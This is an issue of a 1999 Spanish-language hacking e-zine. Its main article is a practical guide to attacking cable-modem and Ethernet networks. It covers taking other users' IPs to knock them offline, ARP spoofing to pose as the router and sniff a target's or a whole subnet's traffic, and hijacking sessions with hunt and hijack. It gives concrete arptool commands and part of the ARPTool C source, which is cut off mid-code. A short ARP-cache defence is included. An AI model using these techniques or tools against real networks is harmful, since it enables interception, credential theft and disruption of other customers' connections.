
    #######           ##  #######  - The NetSearch E-Zine -    ##
   ########          ##  ###                                   ###
   #### ##  ###### ##### #######  ######  ###### ##### ######  #######
  ####  ## ###  ##  ##    ###### ###  ## ###  ## ####  ##      ###  ##
  ###  ##  ####### ##        ### ####### ##   ## ##    ##      ###   ##
 ####  ## ##       ##  ##   ### ##      ###   ## ##    ###     ###   ##
 #### ##  ####### ###### #####  ######   ######## ##   ####### ###   ##


             +-----------------------------------------------+
             | The NetSearch E-Zine - Numero III - Volumen I |
             |                  1/10/1999                    |
             +-----------------------------------------------+


   "And here is this device... Now install the proper drivers...
    And you loaded that scanner that.... woow!"


x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-


+----------------------------------------------------------------------------+
| NOTA: Ninguno de los autores que han colaborado se hacen responsables de   |
|       lo que ignorantes o desaprensivos puedan hacer una vez hayan leido   |
|       sus respectivos articulos.                                           |
+----------------------------------------------------------------------------+


 + INFORMACION ACERCA DE NETSEARCH


 - WEB OFICIAL:
 
                http://members.tripod.com/neogenesys
		(Notese cambio de site)
 
 - CANAL OFICIAL:

                #netsearch , en el IRC-Hispano

 - MAIL OFICIAL:

                netsearch@phreaker.net
                (tambien ha cambiado el e-mail)

 - DISTRIBUIDORES OFICIALES:

                http://members.tripod.com/neogenesys
                http://members.xoom.com/lynux
		http://hello.to/hacker_novatos
		http://www.pasanet.es/usuarios/fgarcia/index.html

                (Si quereis distribuir el e-zine, ya sabeis...
                 mailto: netsearch@hushmail.com)

 - LLAVE PGP OFICIAL:
(Notese tambien el cambio de llave)

<++> pgpkeys/NetSearch.asc $0d4424431645f9ba66e37b2163ea5a39
-----BEGIN PGP PUBLIC KEY BLOCK-----
Version: GnuPG v1.0.0 (GNU/Linux)
Comment: For info see http://www.gnupg.org

mQGiBDfktOcRBADdAYueXFODZ1CMo5a3uOlolLaWiuMvoLQ79jn3Vxt6wnvmU8Gt
IU8yt09R22bQR+/pqFnJTamMEgCRR2zer0SW46hppkdpDGAx2ZbOZrMLo+ST2hMM
Mios1cnG0BdFPhjmzTs6sBb88SJQap6WyjJCjpdpu/kfkBOYjqCzbVRp1wCgrAat
dVO2jMpznt1d/Bvqo/kBTsMD/RrAGcy98TylqSvlKe5Tm8UPnfybGnk/ywxhXufd
zv2s7G99J0dwoGOkAOpRF/8KBmooiOwnWiIczKbzAJ3A3Z83q6jyIfFX9azdzf/O
ZOgIhXnMkodishsgvm9ok9Re8txInJedP74KaBNHM1LLwgmuwy16MG97JNj4JvCN
5oz/BAC/DcaHdANrDKgKam+JS9bolDdZ3fCVTQXDdYUQ09ayMqEAd0gob6220RI7
zKNfgqMvRyD2nqVlvUAY9+8bxdk09nQPfepcA8l9EyYYnA8mVoEpOiNgRO4w2jKE
x23DhPZHm9q7QD1T1UC5+Lnx/K0Y5RTIY6kWcuOkYL/oo2eYnLQiTmV0U2VhcmNo
IDxuZXRzZWFyY2hAaHVzaG1haWwuY29tPohVBBMRAgAVBQI35LTnAwsKAwMVAwID
FgIBAheAAAoJEJYbLBk8Ov2b4qsAoIJUq+a0iPc8OibQOOCjMN4C0MDpAKChGuYB
rJxYOq0xqgeFub/1ICpRRrkBDQQ35LT5EAQApv+IM66+a1j0dUcFCPN4pT6CXDLf
nkRGWh83dDOuU7JVdczaYH4c5DqZJyBxGEx8QqtN86AA/6o4Rq8serAUEvvRGF4Z
bRYh+q3USgNNOt7G04UT6nZRlYkvf9ozqeT+3oaLbtoVzaZsBZ1GSTGoEBCFTYa9
G39OUm6NY9jq1FMAAwYD/1fzENpT1vLHhFzwRwtJYFyiMdtlfhuWtC8xZ2ZWKR4H
+s8soiX7kiWktDkfjRBeZYB7mebPnnlqbdJOrihdjDYQxBdjrn5GXe9yQygmKJzl
ltXYAw7+JbGTqtyMHjqHmwdsQcyRnn4quyF4RNVQka+G5KkMBLuxD8qkHJk7TlYG
iEYEGBECAAYFAjfktPkACgkQlhssGTw6/ZvMcQCdGcWkXFZ1mwlV+mI23UQe5NEh
uukAoKYfAecACeT/VBy7pQ1SKfs1gHfW
=Lwo7
-----END PGP PUBLIC KEY BLOCK-----
<-->

 - COLABORACIONES:

		* Posidon    - hacker_novatos@hello.to
                * ulandron   - ulandron@undersec.com
                * cafo       - encmesiah@bigfoot.com
		* Aule       - aule@mixmail.com
                * Freed0m    - freedom@undersec.com
		* GamerX     - gamer32@mixmail.com
                * p0th       - p0th@undersec.com
                * IReick     - ireick@hotmail.com
                * DarK FeaR  - darkfear@hotpop.com

 - SALUDOS:

                * A los e-zines de habla hispana
                * A todos los que nos leeis ;)


 - RECOMENDADO EL USO DEL EDIT DE MS-DOS O EL JED DE LINUX.


x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-


 + TOC:


   +-------------------------------------------------+---------------+
   |                     TITULO                      |     AUTOR     |
   |-------------------------------------------------+---------------|
   | + Editorial                                     |   DarK FeaR   |
   |-------------------------------------------------+---------------|
   | + NetSearch al Habla                            |   NetSearch   |
   |-------------------------------------------------+---------------|
   | + Jugando con el cable                          |  Posidon &    |
   |                                                 |  ulandron     |
   |-------------------------------------------------+---------------|
   | + Criptografia (y III)                          |   cafo        |
   |-------------------------------------------------+---------------|
   | + Ocultacion de IPs                             |   Aule        |
   |-------------------------------------------------+---------------|
   | + Curso de Programacion en Pascal (III)         |   Freed0m     |
   |-------------------------------------------------+---------------|
   | + Secure Carding                                |   GamerX      |
   |-------------------------------------------------+---------------|
   | + IPv6, el futuro de Internet                   |   p0th        |
   |-----------------------------------------------------------------|
   | + Samba                                         |   IReick      |
   |-------------------------------------------------+---------------|
   | + Arquitectura de sistemas *NIX                 |   DarK FeaR   |
   |-------------------------------------------------+---------------|
   | + Llaves PGP                                    |   NetSearch   |
   |-------------------------------------------------+---------------|
   | + Fuentes del NetExt                            |   cafo        |
   |-------------------------------------------------+---------------|
   | + Despedida                                     |   NetSearch   |
   +-------------------------------------------------+---------------+

x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-

=[00001b]=====================================================================
=[Editorial]==================================================================
=[por DarK FeaR]==============================================================


     Tres... ya llevamos tres :). Si, parece que al final hemos sobrevivido
otro numero mas, y esperemos almenos llegar al numero cinco (parece ser el
numero del exito xD). Pues bien, como podeis ver en cada numero aumenta el
numero de articulos y la informacion que se cuenta. En este numero tenemos
desde carding hasta una explicacion del sistema IPv6... para todos los
gustos ;). Y no se os ocurra quejaros porque hayamos tardado un poco mas en
sacarlo jeje, porque fijaros en otras publicaciones, que no veas como se
rallan (y no estoy hablando de la phrack eh? xD).

     En cuanto a cosas como la pagina web y el correo... vamos a ver. La
pagina como podeis ver ha cambiado a la nueva direccion,
http://members.tripod.com/neogenesys. El correo ha sido cambiado tambien, ya
que Hushmail, aun ser una buena alternativa por el rollo de la encriptacion,
es algo lento y no acepta attachments. La nueva direccion sera
netsearch@phreaker.net.

     Para no parar de rallaros pues os dire, como en todos los numeros, que
necesitamos vuestras colaboraciones :). Y no lo digo por sistema, sino que
es la pura realidad, ya que sin vuestras colaboraciones el e-zine dejaria de
existir.

     Bueno, como no se me ocurre nada mas, pues no os doy el palo xD. Que aun
os queda leer 'NetSearch al Habla' asi que, nos vemos.

                              DarK FeaR


=[00010b]=====================================================================
=[NetSearch al Habla]=========================================================
=[por NetSearch]==============================================================


     Bueno, como habreis visto los que esteis en contacto con el mundillo de
netsearch este mes de septiembre ha sido movidillo ;). Pero bueno, eso ya
esta olvidado (o eso creo) y vamos a centrarnos en otras cosas.

     En primer lugar, pues decir que seguimos en el reto del RC5, y que a
ver si conseguimos avanzar esas posiciones que nos faltan (unas cuantas :P)
para coger a nuestros competidores en la pequeña liguilla de e-zines de
habla hispana que hay montada.

     Otro tema es que se ha hablado de la posibilidad de registrar un
dominio, en principio netsearch.net ya que .org y .com ya estan cogidos.
Tambien se ha pensado en netsearch.es, pero bueno, en mi (humilde) opinion
no me hace mucho la verdad :P. Bueno, si lo hemos puesto en el e-zine ha
sido para hacer una especie de referendum, a ver que os parece y quien esta
dispuesto a colaborar (economicamente hablando, se entiende :). En un
principio lo que se haria seria pasar la web al servidor y ademas ampliarla
un poco, como actualizar (casi) diariamente las noticias, por
ejemplo. Tambien esta en mente la creacion de un ftp publico, donde ademas
del e-zine habria como no, textos y programas relacionados con el tema de la
seguridad, el hack y la informatica en general. Los que colaboraran pues en
un principio tendrian su cuenta de correo pop3. Bueno, esto es un proyecto
de gran envergadura mas que nada por el factor economico, y que necesita
debatirse a fondo.

     Aprobechando la ocasion recordaros a los que aun no esteis en la lista
de correo que ya tardais en suscribiros! La direccion es
netsearch@onelist.com y el tema, como no, todo lo relacionado con la
seguridad informatica (aunque a veces se desvie el tema a donde no debe :P).
Otra cosa mas para si montamos el dominio, la puesta en marcha del
'majordomo' propio para la lista, y dejarnos de la, aunque pequeña, algo
molesta, propaganda que cuela onelist.

     Bueno, creo que no me dejo nada mas que deciros sobre netsearch, asi
que sin mas rodeos vamos a lo que interesa, la informacion ;).


=[00011b]=====================================================================
=[Jugando con el cable]=======================================================
=[por Posidon y ulandron]=====================================================


.- Indice.
-------------

0.- Prorrogo.
1.- Obteniendo una ip valida en internet.
2.- Obteniendo mas de una ip valida en internet.
  2.1.- En OpenBSD 2.5
3.- Jugando con el protocolo arp.
  3.1.- Explicacion de los protocols arp y rarp.
4.- Sniffeando conexiones.
5.- Alternativa al ArpTool: Arp-Fun.
6.- Hijackeando conexiones.
7.- Notas finales.
8.- Sources.
9.- Despedidas.

-------------



0.- Prorrogo.

Buenas, este texto pretende aclarar un poco como funciona la tecnologia del
cable, y sobre todo como explotar sus vulnerabilidades. Esta enfocado mas que
nada al apartado practico, asi que no espereis mucha teoria aqui ;). Todos los
experimentos que se han realizado se han hecho sobre una especifica empresa de
internet por cable, por lo tanto no puedo asegurar que funcionen en otra compa-
ñia, aunque supongo que mas o menos funcionan todas igual, menos Menta que creo
que usa (o usaba) un proxy. Tambien son aplicables a todas las intranets que
funcionen bajo el protocolo ethernet. En fin, empecemos con el txt.

Como algunos sabreis y otros no, el cable-modem famoso tiene una entrada y una
salida. La entrada es un conector bnc para el cable coaxial, el mismo cable por
el que viene la señal de television, y la salida es por medio de un conector
rj45, que se conecta por medio de cable trenzado a una tarjeta ethernet que
tengas instalada en el ordenata (el cable no va cruzado). Como habreis imagina-
do el modem se comunica por medio del protocolo ethernet, en realidad lo que
tenemos es muy parecido a una lan normal y corriente, a excepcion de que hay
ordenadores conectados de toda la ciudad, y unas cuantas cosas mas que veremos
mas adelante. Bien, como lo que tenemos es una lan conectada a internet, o sea,
una intranet, tiene mas o menos los mismos problemas que una red local, y como
el protocolo ethernet ya esta explotado hace mucho tiempo lo unico que vamos a
hacer nosotros es aprovechar esas debilidades }:).


1.- Obteniendo una ip valida en internet.

Aqui lo que hace la mayoria de la gente es poner a rular un cliente dhcp, el
cliente se comunica con el server dhcp, este le facilita toda la informacion
(ip, gateway, mask, etc), y el cliente lo hace todo automatico. El problema de
esto es que tu no puedes modificar nada, ya que va todo automatico. Entonces lo
que se puede hacer es meter tu todos los datos manualmente, es decir, direccion
ip, mask, broadcast y gateway a internet. Para conseguir todos estos datos pue-
des poner a rular primero el dhcp, apuntas los datos y luego los metes tu, con
una excepcion, la direccion ip, aqui lo normal seria meter la que te habia
asignado antes el server dhcp, pero puedes poner cualquier ip dentro del rango
valido, es decir si el rango valido es de 191.1.1.* a 191.1.10.* pues pudes po-
nerte la ip que quieras. No hace falta decir lo util que es esto para evitar
bans o glines indeseados :). Tambien es util para nukear a algun indeseado de
tu misma compañia de cable, lo unico que tienes que hacer es cambiar tu ip por
la suya durante unos breves segundos, entonces a el le saldra un error de adap-
tador muy guapo y tendra que reiniciar para volver a tener conexion. Por
cierto que espero que no hagais mal uso de esto, los que tengan cable o esten
en una intranet mas o menos grande, ya que se puede armar un lio enorme :).


2.- Obteniendo mas de una ip valida en internet.

Sip, como habeis leido esto tambien es posible, como?, pues con aliasing, que
es una caracteristica del kernel para poder asignar mas de una ip a un mismo
interface, lo unico que hay que tener es el kernel compilado con soporte para
ip alias. Veamos un ejemplo con eth0, se supone que ya tienes asignada la ip,
la mask y el broadcast, pues lo que tenemos que crear ahora es un alias de 
eth0, por ejemplo eth0:0. Para crear nada mas facil que "ifconfig eth0:0 ip
broadcast ipbc netmask m", ip es la ip que quieres tener (tiene que estar en
el rango valido), ipbc es la ip del broadcast y m es la mask. Despues de eso
ya tendras 2 ips validas en internet, ahora por ejemplo para entrar al irc con
la nueva ip lo que tienes que hacer es instalar un bouncer que tenga soporte
para vhost, pq en realidad lo que hicimos es un vhost. Lo defines bien, lo po-
nes rulando y ya entras al irc con la nueva ip :). Si quieres crear mas ips va-
lidas sigues el mismo proceso, pero con eth0:1, eth0:2, etc. Para dar de baja
una ip pones "ifconfig eth0:n down", cambiando la n por el numero del alias que
quieras borrar claro esta :).


2.1.- En OpenBSD 2.5 (ulandron)

Esto es un pequeño anexo a la seccion anterior, ya que Posidon no ha tenido
la oportunidad de probarlo en un openbsd.

# ifconfig xl0 alias 192.168.1.1 netmask 255.255.255.255
Le añado una mask de todo 1's porque si no en openbsd da el siguiente
error: ifconfig:SIOCAIFADDR: File exists.

El resto es muy similar a linux, aunque la sintaxis del comando route(8),
por ejemplo, cambia un poco.


3.- Jugando con el protocolo arp.

El protocolo arp (address resolution protocol) es el que se encarga de resolver
una direccion a una direccion ip, la direccion mac es la direccion fisica de la
tarjeta de red, y consta de 6 numeros en hexadecimal, tipo 00:00:11:1D:01:B4.
Esta direccion viene de fabrica con la tarjeta y es imposible cambiarla.. bue-
no, supongo que por medios electronicas se podra, pero vamos que no esta al
alcance de cualquiera. El protocolo rarp (reverse address resolution) es lo
contrario, se encarga de resolver direcciones macs a direcciones ip. Cuando un
ordenador hace una peticion para resolver una ip a una mac, lo que hace es man-
dar la peticion a la direccion broadcast, para que asi le llegue a todos los
ordenadores que forman la lan, luego el ordenador al que le corresponde esa ip
le manda un arp reply a la maquina que hizo la peticion con su direccion mac.
Esto es explicado brevemente, pero gracias a ulandron tenemos aqui una expli-
cacion mas detallada del funcionamiento de estos protolos :), aqui la teneis.


3.1- Explicacion de los protocols arp y rarp por ulandron.

ARP es un protocolo fundamental para el funcionamiento correcto de practica-
mente cualquier implementacion de TCP/IP. Es el encargado de "traducir" las
direcciones ip de 32 bits a las correspondientes direcciones de hardware sub-
yacentes. En ethernet & Token ring estas direcciones suelen tener 48 bits. La
traduccion inversa la hace el RARP o Reverse ARP. Esto podria esquematizarse
asi:

                        ARP
 Direccion de          ------->             Direccion
 internet de                                ethernet de
 32 bits               <-------             48 bits
                        RARP


Cuando un host Y quiere iniciar una conexion con otro X del que conoce la ip(X),tiene que efectuar una peticion arp (Arp request) a la broadcast de ese segmen-
to de red, FF:FF:FF:FF:FF:FF, pidiendo que el host con dicha ip responda con su
direccion ethernet (en nuestro ejemplo) de 48 bits.

Para entrar un poco mas en detalle veamos el formato de un paquete arp:
(Extraido del tcp/ip illustrated I, stevens)
-------------------------^------------------------------------
  Mac   |  Mac   | Tipo  | Tipo  | Tipo | Tam  | Tam  | Op |   (Continua)
destino | fuente | Trama | Hardw | Prot | Hard | Prot | Op |
-------------------------^------------------------------------
   6        6        2       2       2     1      1      2       (bytes)

            --------------------------------------------
(Continuacion)   | Mac    |  Ip    | Mac     |   Ip    |
                 | Emisor | Emisor | Destino | Destino |
            --------------------------------------------
                     6        4        6          4         (bytes)


- Los 2 primeros campos indican la direccion ethernet fuente y destino. Una
trama cuya direccion de destino este compuesta por todo 1's se denomina broad-
cast y es entregada a todas las interfaces de una subred.
- El tipo de trama especifica el contenido del resto del paquete. Para un arp
toma el valor de 0x0806.

Estos 14 bytes forman la cabecera de una trama ethernet.

- Tipo de hardware especifica el medio sobre el que se trabaja. Toma el valor
de 1 para ethernet.
- Tipo de  protocolo que es mapeado: 0x0800 para IP.
- Tamaño de direccion de hardware y tamaño de direccion de protocolo (que feo
queda esto) son 6 y 4 respectivamente, como es logico.
- Operacion especifica si el paquete es un ARP request (1), ARP reply (2), RARP
request (3), RARP reply (4).
- Los siguientes 4 campos son la direccion mac & ip fuente y la mac & ip del
destino. En un arp request la mac destino logicamente no esta rellenada porque
no se sabe.

Ya podemos ver con exactitud que ocurre cuando un host intenta efectuar una
conexion.

Manda un paquete arp a la broadcast, rellenando la ip de destino y dejando va-
cio el campo de la mac de destino. El host con esa ip recibe el paquete, ve que
es suyo, intercambia las direcciones eth & ip fuente y destino, rellena la
fuente nueva con su propia mac y responde con un arp reply al host que lo en-
vio, no a la broadcast.

.- Fin de explicacion :).

Bueno, y ahora que sabemos como funciona el protocol arp vamos a ver como pode-
mos explotar sus vulnerabilidades. Aunque la direccion mac de tu tarjeta de red
no se pueda cambiar, lo que si se puede hacer es spoofear, para ello nos basare-
mos en una utilidad llamada arptool, del que teneis el codigo fuente al final
del txt ( aunque tb se pueden usar otros programas, como el estupendo arp-fun de
ulandron ;) ).

Con esta utilidad podremos mandar paquetes arp request o paquetes arp reply, en
principio los que nos interesan son los reply. El funcionamiento explicado asi
por encima es el siguiente, nosotros lo que queremos hacer es que la makina con
direccion ip 111.111.111.111 se crea que la direccion mac de 111.111.111.222 es
00:00:2B:02:5B:02, cuando la verdadera mac de 111.111.111.222 es cualquier otra.
Lo primero que tenemos que hacer es averiguar la mac de 111.111.111.111 (joer,
esto se esta convirtiendo en un lio de numeros), para ello hacemos un ping a
111.111.111.111. Al hacerle el ping su direccion mac quedara guardada en nues-
tra cache, o sea que haciendo un arp -a saldra su citada mac. Despues de esto
es bien sencillo, usamos el arptool para bombardear sin parar a 111.111.111.111
con arps replys spoofeados para hacer creerle que nosotros somos 111.111.111.222
y que le estamos contestando a sus peticiones, y of course le mandamos los re-
plys como que nuestra mac es 00:00:2B:02:5B:02, habeis entendido algo? XD.

La forma practica de hacer esto seria:
"./arptool -s 00:00:2B:02:5B:02 macde111.111.111.111 111.111.111.222 111.111.
111.111 2 -c 1". El 2 seria para indicar que son arp replys, y no request, y
el -c 1 para que lo este enviando sin parar 1 vez por segundo.

Y bien, aqui entra otra forma de nuke, no se os ocurre cual? Pues es hacerle
creer a una determinada makina que la mac del router que usa para salir a in-
ternet es una que no exista, no pongo el ejemplo pq se supone que ya os lo sa-
beis currar solitos ;).
 

4.- Sniffeando conexiones.

Por suerte o por desgracia, no es posible hacer sniffing de la forma tradicio-
nal, es decir, poniendo la tarjeta ethernet en modo promiscuo y capturando to-
do. La razon es que el modem filtra los datos, por lo tanto solo te llegaran
los paquetes que vayan dirigidos a ti, hace mas o menos lo mismo que algunos
hubs con "inteligencia". Pero tranquilos, pq aunque no se pueda a la primera
trabajandolo un poco mas si que es posible. Para conseguir sniffear alguna
conexion lo que le tenemos que hacer creer a la makina objetivo es que la mac
del router es nuestra mac. Os recuerdo que la infrastructura de las redes que
forman las compañias de cable no es mas que una lan conectada a internet por
un router, de tal forma que todos los paquetes que los usuarios manda a inter-
net pasan por ese router, y que ese router tiene una ip y una mac. Pues senci-
llamente lo que vamos a hacer nosotros es de router intermedio (por cierto que
para que esto rule tienes que tener compilado el kernel con soporte para ip
forward y tenerlo activado).

Veamos si lo explico mejor con un ejemplo, nosotros tenemos una maquina A, y
otro usuario objetivo tiene una maquina B, y el router es la maquina R, mA es
la mac de A, mB la de B y mR la mac del router. Pues bien, lo que haremos sera
usar el arptool para bombardear a B con arps replys modificados para hacerle
creer que la mac de R (mR) no es mR sino es mA, o sea nuestra mac, de tal for-
ma que ese usuario (B) mande todos los paquetes a nosotros, y nosotros haremos
de router intermedio, mandando todos los paquetes que B nos manda a R, y B no
sospechara nada porque todo se hara de forma transparente, y el ni perdera la
conexion ni nada. Y que conseguimos con esto, pues poder sniffear todas las
conexion que B haga hacia internet, con un sniffer normal, como sniffit. Por
supuesto se pueden hacer muchas mas cosas pero bueno, ahora estamos en el
apartado de sniffear conexion :). Y tambien podemos ir mas alla, que pasa si
queremos sniffear todas las conexiones de toda la subred? Pues muy sencillo,
configuramos el arptool para bombardear toda la subred con arps replys modifi-
cados para que mR parezca mA. Para hacer esto mandamos los arps a la direccion
de broadcast, y en la direccion mac de destino ponemos FF:FF:FF:FF:FF:FF, que
es la mac de la direccion de broadcast, y ya esta, a poner el sniffer rulando
a todo trapo.

Nota: Os recomiendo que no andes jugando con esto porque os podria caer un
puro considerable, a parte de que os pueden pillar facilmente, ya que vuestra
mac estara a la vista de cualquiera, y con la mac ya pueden identificar vuestro
modem.


5.- Alternativa al ArpTool: Arp-Fun.  (ulandron)

Arp Fun es un programa muy similar al arptool, que en un principio fue
desarrollado para ser usado solamente en el contexto de este texto, y para
asentar mis conocimientos con las libnet. Pero una vez acabada la parte
basica, y viendo lo facil que es programar con libnet decidi añadirle mas
funciones y en eso estoy. En el momento de escribir este texto voy por la
v0.2, y estoy trabajando en varias mejoras. Mi objetivo principal es
incorporar toda la funcionalidad del arptool, con la ventaja de ser
portable a numerosas plataformas (todas en las que compila libnet).
Del arptool original solo falta la opcion -m (network map mode). 

Su uso es sencillo e intuitivo. Requiere un minimo de 1 parametro. -d IP.
En algunos casos el programa no puede determinar automaticamente la mac de
destino. En ese caso habra que especificarla con la opcion -m. Con esto
mandaremos un arp reply por la primera interfaz disponible que no sea la
loopback, con nuestra mac & ip verdadera de origen. Para aplicar la
teoria de este texto, y hacernos pasar por el router tendremos que
añadirle un parametro mas: -s ip_del_router. Todo lo demas son opciones
mas o menos utiles, como la posibilidad de establecer un intervalo entre
envio de paquetes, el numero de paquetes a enviar, mayor detalle, etc etc.
Un -c 20 -x 300 por ejemplo envia un paquete cada 5 minutos durante 1
hora, con lo que podremos minimizar el efecto que tendran los arp's
verdaderos del router sobre el host objetivo. En un futuro me gustaria
añadir un sniffer que capturara los arps verdaderos de la red e
inmediatamente respondiera con uno falso. Para la v0.3 :)

Me gustaria que lo probarais en diferentes arquitecturas y me comentarais
los resultados obtenidos. Por ahora lo he compilado en un 2.3.15, 2.2.12 y
en la ultima version del OpenBSD, 2.5. La ultima version estara disponible en
http://www.undersec.com/members/ulandron/index.shtml.

La v0.2 esta añadida al final del texto, se puede extraer con el tipico
"extract" de la phrack. Creara una serie de archivos en el directorio
arp-fun. Recomiendo leer el readme, editar el Makefile por si hace falta,
make, make install.
Esta version no incorpora las librerias necesarias para compilarlo, dado
que no puedo meter los 350 k's que ocupa en total en este texto. Para una
version completa recomiendo la descarga de la ultima version en la url
mencionada 9 lineas mas arriba. 

Espero que sea util ;)


6.- Hijackeando conexiones.

Esta parte tambien esta entretenida, se basa en "robar" conexiones activas, me-
diante tecnicas bastante complicadillas basadas en averiguaciones de los nu-
meros de secuencia, etc. Como ya hay amplia informacion de ip hijack por la red
no voy a ponerme a explicar como funciona, te remito por ejemplo a set19 en el
que hay un articulo bastante aclarador. Ahora pasemos a la parte practica.

Como programa para hijackear normalmente usaremos el hunt, que puedes conse-
guirlo en http://hello.to/hacker_novatos (seccion misc), ya que es mas
vistoso que el tipico hijack.c y a parte trae mas opciones, como por ejemplo 
scanear una subred para detectar sniffers, "ver" conexiones, etc.

Lo primero que haremos sera lo explicado en el apartado 4 para sniffear cone-
xiones, es decir, hacer creer al host objetivo que nosotros somos el router.
Una vez que ya estemos filtrando todas las conexiones del host, lo unico que
tenemos que hacer es ejecutar el hunt y esperar, cuando tengamos una conexion
activa el -> de la linea de comandos se convertira en *>. Despues solo tenemos
que movernos por los menus que trae, como por ejemplo watch connections (para
ver los datos que se mandan cliente-servidor), reset connections (para mandar
a tomar viento la conexion), etc..

El unico problema es que el hunt solo escucha en unos determinados puertos, 
como el 21, 23, 110, etc.., si quieres hijackear otra conexion de otro puerto 
no podras, tendras que usar el hijack. Para usar el hijack tienes que indicarle
la direccion ip de la maquina cliente, el puerto que esta usando el cliente 
(lo sacas sniffeando) y la direccion ip de la maquina servidor, una vez ejecu-
tado se hace todo de forma transparente y si todo va bien ya tendrias la shell,
el ftp o lo que fuera ;). El codigo fuente del hijack lo podeis conseguir en
http://hello.to/hacker_novatos tambien, seccion misc. 


7.- Notas finales.

Lo primero decir que espero que no hagais mal uso de esto ;). Lo segundo es
una forma de protegerse ante el arp spoof. Como sabreis el arptool lo que ha-
cia era "floodear" un host con arps replys, luego el host atacado guardaba la
mac modificada en la cache y se lo creia todo. Por cierto que todos los orde-
nadores tienen una cache para las macs que vayan resolviendo, tipo nameserver
con las ips. Pues bien, lo que haremos sera modificar nuestra cache para que
la mac del router tenga el flag PERM, es decir, permanente. De esta forma nues-
tra maquina nunca hara una peticion para resolver la ip del router, siempre la
cogera de la cache y no habra forma de que alguien se haga pasar por el router
mandandonos arps replys (pq nuestra maquina los ignorara). Para hacer esto lo
unico que haremos sera meter la mac del router manualmente con el comando arp,
de la siguiente forma: "arp -s ipdelrouter macdelrouter". Cada vez que reini-
ciemos el ordenata el flag PERM se perdera por lo que seria conveniente meter
esa orden en el rc.local. Por supuesto como el router cambie de mac dejara de
rularnos internet, pero para que le cambiara la mac tendrian que cambiarle la
tarjeta de red, y eso es una cosa poco probable.


8.- Sources.


Arptool:

<++> Cable/arptool.c !21ea3fd4

/* 
 *      ARPTool v0.1, (c) Cristiano Lincoln Mattos, 1999 - <lincoln@hotlink.com.br>
 *
 *      - Compiled and tested on Linux 2.0.33, 2.0.35, 2.0.36, libc5 & glibc.  
 *        Will port to Solaris 2.5.1 as soon as i have time.
 *      - For usage, run it without arguments.
 *      - If you dont know what this is for, or what you can do with it, 
 *        read yuri volobuev's excellent bugtraq post about ARP spoofing 
 *        (available from the bugtraq archives).
 *      - The netmap results depend on the network latency.. try adjusting the
 *        usleep() delay, if you think it's too small/big.
 *      - The latest version will be always at 
 *              http://www.hotlink.com.br/users/lincoln/arptool
 *      - Some code borrowed from neped (apostols.org), thanks.
 *      
 *      #include <stddisclaimer.h>
 *
 *      CHANGELOG:
 *         09/12/98 - General code cleanup.
 *         07/12/98 - Removed the option for hiding in the process list, and
 *                    double mode: didn't work as expected, stupid oversight.
 *         29/12/98 - Better display of MAC's with more than one IP (proxy 
 *                    arp or virtual interfaces).
 *         28/12/98 - Added check for arp reply being to source ip (netmap).
 */

#include <stdio.h>
#include <stdlib.h>
#include <linux/if.h>
#include <linux/sockios.h>
#include <linux/in.h>
#include <linux/if_ether.h>
#include <unistd.h>
#include <fcntl.h>

#define ARP_ETHER       1
#define ARP_REQUEST     1
#define ARP_REPLY       2

/* Structures */
struct pkt_struct {
        unsigned char eth_dst[6];
        unsigned char eth_src[6];
        unsigned short eth_proto;
        unsigned short int arp_hw_type;
        unsigned short int arp_proto;
        unsigned char arp_hw_len;
        unsigned char arp_proto_len;                    // proto is IP.
        unsigned short arp_oper;
        unsigned char arp_hw_src[6];
        unsigned char arp_ip_src[4];
        unsigned char arp_hw_dst[6];
        unsigned char arp_ip_dst[4];
};

struct spoof_struct {
        unsigned char hw_src[6];
        unsigned char hw_dst[6];
        unsigned long int ip_src;
        unsigned long int ip_dst;
        unsigned short op;
};

/* List structures */
struct iplist_struct {
        unsigned long int ip;
        struct iplist_struct * next;
};

struct list_struct {
        unsigned char hw[ETH_ALEN];
        struct iplist_struct * iplist;
        struct iplist_struct * lastip;
        struct list_struct * next;
} * head = NULL, * tail = NULL;

/* Functions */
char * hwaddr_to_str (unsigned char * str);
unsigned char * str_to_hwaddr (char * str);
unsigned int hexstr_to_int (char *cptr);
void netmap (int fd, unsigned long int start_ip);
void usage (char * av, int mode);
void add_to_list (unsigned long int ip, unsigned char * hw);
void show_list ();

/* Global variables */
unsigned long netmask, broadcast;                       /* struct in_addr */
unsigned char hwaddr[ETH_ALEN];
struct sockaddr sock;
int verbose = 0;

void sendarp (int fd, unsigned char * h_source, unsigned char * h_dest, \
                      unsigned char * arp_src, unsigned char * arp_dst, \
                      unsigned long int ip_source, unsigned long int ip_dest, unsigned char op) {
        struct pkt_struct pkt;

        // Ethernet header.
        memcpy(&pkt.eth_dst,h_dest,ETH_ALEN);
        memcpy(&pkt.eth_src,h_source,ETH_ALEN);
        pkt.eth_proto = htons(ETH_P_ARP);
        // ARP header.
        pkt.arp_hw_type = htons(ARP_ETHER);
        pkt.arp_proto = htons(ETH_P_IP);
        pkt.arp_hw_len = ETH_ALEN;
        pkt.arp_proto_len = 4;
        pkt.arp_oper = htons(op);

        if (arp_src==0) bzero(&pkt.arp_hw_src,ETH_ALEN);
                else memcpy(&pkt.arp_hw_src,arp_src,ETH_ALEN);
        if (arp_dst==0) bzero(&pkt.arp_hw_dst,ETH_ALEN);
                else memcpy(&pkt.arp_hw_dst,arp_dst,ETH_ALEN);

        memcpy(&pkt.arp_ip_src,&ip_source,4);
        memcpy(&pkt.arp_ip_dst,&ip_dest,4);

        if ( (sendto(fd,&pkt,sizeof(pkt),0,&sock,sizeof(sock))) < 0) perror("Error sending ARP");

        if (verbose) {
                char ips[16], hws[18];
                strncpy(ips,inet_ntoa(ip_source),16);
                strncpy(hws,hwaddr_to_str(pkt.eth_src),18);
                printf(" - Sending packet: Ether src: %s   -   Ether dst: %s \n",hws,hwaddr_to_str(pkt.eth_dst));
                strncpy(hws,hwaddr_to_str(pkt.arp_hw_src),18);
                printf("                   ARP hw src: %s   -   ARP hw dst: %s\n",hws,hwaddr_to_str(pkt.arp_hw_dst));
                printf("                   ARP ip src: %s   -   ARP ip dst: %s   -   ARP op: ",ips,inet_ntoa(ip_dest));
                if (op==1) printf("%s\n","Request");
                        else printf("%s\n","Reply");
        }

}

void netmap (int fd, unsigned long int start_ip) { 
